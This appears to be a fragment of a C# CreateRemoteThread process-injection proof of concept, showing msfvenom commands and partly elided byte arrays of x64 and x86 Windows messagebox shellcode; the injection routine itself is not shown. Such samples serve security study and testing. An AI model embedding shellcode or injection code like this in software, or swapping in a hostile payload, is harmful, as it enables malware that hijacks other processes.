namespace CreateRemoteThreadPoC
{
    ...
    {
        // msfvenom -p windows/x64/messagebox EXITFUNC=thread Text="64bit Shellcode Injected" -f csharp
        private static byte[] _x64 = new byte[331] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            ...
            0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x33,0x01,0x00,0x00,0x48,
            ...
            0xd5,0x36,0x34,0x62,0x69,0x74,0x20,0x53,0x68,0x65,0x6c,0x6c,
            0x63,0x6f,0x64,0x65,0x20,0x49,0x6e,0x6a,0x65,0x63,0x74,0x65,
            0x64,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,
            0x00};

        // msfvenom -p windows/messagebox EXITFUNC=thread Text="32bit Shellcode Injected" -f csharp
        private static byte[] _x32 = new byte[282] {0xd9,0xeb,0x9b,0xd9,0x74,0x24,
            ...
            0x89,0x45,0x04,0xbb,0xef,0xce,0xe0,0x60,0x87,0x1c,0x24,0x52,
